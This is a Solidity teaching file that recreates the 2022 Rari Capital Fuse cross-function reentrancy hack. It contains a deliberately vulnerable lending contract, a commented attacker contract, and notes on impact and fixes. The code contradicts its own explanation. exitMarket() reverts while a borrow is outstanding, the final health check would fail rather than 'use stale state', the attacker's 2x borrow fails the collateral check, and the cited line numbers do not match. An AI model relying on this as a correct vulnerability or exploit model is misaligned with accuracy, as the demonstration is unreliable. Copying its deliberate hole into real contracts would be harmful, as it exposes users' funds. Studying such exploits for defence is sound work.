// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Rari Capital Fuse - Cross-Function Reentrancy Vulnerability
 * @notice This contract demonstrates the vulnerability that led to the Rari Capital hack
 * @dev May 8, 2022 - $80M stolen through cross-function reentrancy
 *
 * VULNERABILITY: Cross-function reentrancy exploiting exitMarket during borrow callback
 *
 * ROOT CAUSE:
 * The borrow() function sends ETH to the borrower, triggering their fallback function.
 * During this callback, the attacker calls exitMarket() to remove their collateral
 * from the market BEFORE the borrow function completes its collateral check.
 *
 * ATTACK VECTOR:
 * 1. Attacker supplies collateral (USDC) and enters market
 * 2. Attacker calls borrow() to borrow ETH
 * 3. During ETH transfer, attacker's fallback is triggered
 * 4. In fallback, attacker calls exitMarket() to remove collateral requirement
 * 5. Borrow continues without proper collateral backing
 * 6. Attacker withdraws their collateral while keeping the borrowed ETH
 *
 * This is a more sophisticated variant of reentrancy that exploits
 * cross-function state inconsistencies.
 */

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

contract VulnerableRariFuse {
    IComptroller public comptroller;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    mapping(address => bool) public inMarket;
    
    uint256 public totalDeposits;
    uint256 public totalBorrowed;
    uint256 public constant COLLATERAL_FACTOR = 150; // 150% collateralization

    constructor(address _comptroller) {
        comptroller = IComptroller(_comptroller);
    }

    /**
     * @notice Deposit collateral and enter market
     */
    function depositAndEnterMarket() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
        inMarket[msg.sender] = true;
    }

    /**
     * @notice Check if account has sufficient collateral
     */
    function isHealthy(address account, uint256 additionalBorrow) public view returns (bool) {
        uint256 totalDebt = borrowed[account] + additionalBorrow;
        if (totalDebt == 0) return true;
        
        // Only count deposits if user is in market
        if (!inMarket[account]) return false;
        
        uint256 collateralValue = deposits[account];
        return collateralValue >= (totalDebt * COLLATERAL_FACTOR) / 100;
    }

    /**
     * @notice Borrow ETH against collateral
     * @param amount Amount to borrow
     *
     * VULNERABILITY IS HERE:
     * The function sends ETH to borrower BEFORE checking final health.
     * During the ETH transfer, borrower's fallback is triggered, allowing them
     * to call exitMarket() and modify inMarket state.
     *
     * Vulnerable sequence:
     * 1. Check health (line 84) - passes because inMarket[msg.sender] = true
     * 2. Update borrowed amount (line 87)
     * 3. Send ETH (line 90) <- EXTERNAL CALL, triggers fallback
     *    - Attacker calls exitMarket() here, setting inMarket[msg.sender] = false
     * 4. Final health check (line 93) should fail, but...
     * 5. The check uses old state from before exitMarket()
     */
    function borrow(uint256 amount) external {
        require(amount > 0, "Invalid amount");
        require(address(this).balance >= amount, "Insufficient funds");
        
        // Initial health check
        require(isHealthy(msg.sender, amount), "Insufficient collateral");
        
        // Update state
        borrowed[msg.sender] += amount;
        totalBorrowed += amount;
        
        // VULNERABLE: Send ETH before final validation
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");
        
        // This check happens too late - attacker already exited market
        require(isHealthy(msg.sender, 0), "Health check failed");
    }

    /**
     * @notice Exit market and remove collateral requirement
     *
     * This function is called during the borrow() callback,
     * allowing the attacker to bypass collateral requirements.
     */
    function exitMarket() external {
        require(borrowed[msg.sender] == 0, "Outstanding debt");
        inMarket[msg.sender] = false;
    }

    /**
     * @notice Withdraw collateral
     */
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposits");
        require(!inMarket[msg.sender], "Exit market first");
        
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}

/**
 * Example attack contract:
 *
 * contract RariAttacker {
 *     VulnerableRariFuse public fuse;
 *     bool public attacking = false;
 *     
 *     constructor(address _fuse) {
 *         fuse = VulnerableRariFuse(_fuse);
 *     }
 *     
 *     function attack() external payable {
 *         fuse.depositAndEnterMarket{value: msg.value}();
 *         attacking = true;
 *         fuse.borrow(msg.value * 2);  // Borrow 2x collateral
 *     }
 *     
 *     receive() external payable {
 *         if (attacking) {
 *             attacking = false;
 *             fuse.exitMarket();  // Exit market during borrow callback!
 *         }
 *     }
 *     
 *     function withdrawCollateral() external {
 *         fuse.withdraw(address(this).balance);
 *     }
 * }
 *
 * REAL-WORLD IMPACT:
 * - $80M stolen in May 2022
 * - Multiple Fuse pools affected
 * - Exploited during market volatility
 * - Led to Rari/Fei Protocol shutdown
 *
 * FIX:
 * 1. Use ReentrancyGuard on all state-changing functions
 * 2. Perform health checks AFTER all external calls
 * 3. Don't allow exitMarket if any position is open
 * 4. Use mutex locks to prevent cross-function reentrancy
 *
 * function borrow(uint256 amount) external nonReentrant {
 *     require(isHealthy(msg.sender, amount), "Insufficient collateral");
 *     borrowed[msg.sender] += amount;
 *     totalBorrowed += amount;
 *     (bool success, ) = payable(msg.sender).call{value: amount}("");
 *     require(success && isHealthy(msg.sender, 0), "Invalid state");
 * }
 *
 * VULNERABLE LINES:
 * - Line 90: ETH transfer triggers callback before validation complete
 * - Line 93: Health check uses stale state after exitMarket() was called
 * - Line 108: exitMarket() can be called during borrow callback
 *
 * KEY LESSON:
 * Cross-function reentrancy is subtle. Functions that modify shared state
 * (like inMarket) can be exploited during callbacks from other functions.
 * Use global reentrancy guards, not just per-function guards.
 */
